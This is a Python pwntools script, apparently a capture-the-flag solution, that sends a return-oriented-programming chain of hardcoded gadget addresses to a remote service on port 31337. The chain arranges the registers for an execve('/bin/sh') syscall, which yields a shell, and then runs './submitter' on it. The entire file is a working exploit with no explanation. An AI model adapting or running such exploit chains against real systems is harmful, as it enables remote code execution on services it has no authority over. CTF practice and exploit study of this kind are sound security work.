#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))


def send_rop(addr):
    io.sendline(str(int(hex(addr)[2:])).encode())


syscall = 0x0000000000480680
execve = 0x3b
mov_rax_rdi_ret = 0x0000000000426499
pop_rdi_pop_rbp_ret = 0x0000000000499371
add_rax_rdi_ret = 0x0000000000471885
add_edi_0x61_add_rax_rdi_vzeroupper_ret = 0x0000000000469525
xor_edx_edx_pop_rbx_pop_r12_mov_rax_rdx_pop_rbp_ret = 0x0000000000404759
bin_sh = 0x4a04f9
xor_esi_esi_call_r12 = 0x0000000000480920
pop_r12_pop_rbp_ret = 0x0000000000495901
add_al_ch_ret = 0x0000000000414317
xor_eax_eax_ret = 0x0000000000404782
adc_al_r15b_ret = 0x0000000000426455
pop_r15_pop_rbp_ret = 0x0000000000402217

send_rop(0x300000000)
send_rop(0x300000000)
send_rop(0x300000000)
send_rop(0x300000000)
send_rop(0x300000000)
send_rop(xor_edx_edx_pop_rbx_pop_r12_mov_rax_rdx_pop_rbp_ret)
send_rop(0x1069)
send_rop(0x1069)
send_rop(0x1069)
# here rdx is 0
send_rop(pop_rdi_pop_rbp_ret)
send_rop(0x499778)
send_rop(0x1069)
for _ in range(289):
    send_rop(add_edi_0x61_add_rax_rdi_vzeroupper_ret)
# here rdi is 0x4a04f9
send_rop(xor_eax_eax_ret)
send_rop(pop_r15_pop_rbp_ret)
send_rop(0x1)
send_rop(0x1069)
for _ in range(execve):
    send_rop(adc_al_r15b_ret)
# here rax is 0x3b
send_rop(pop_r12_pop_rbp_ret)
send_rop(syscall)
send_rop(0x1069)
send_rop(xor_esi_esi_call_r12)

io.send(b'x')  # idk why
io.sendline(b'./submitter')
io.sendline(b'./submitter')
io.sendline(b'./submitter')
io.sendline(b'./submitter')
print(io.recvall(timeout=1))
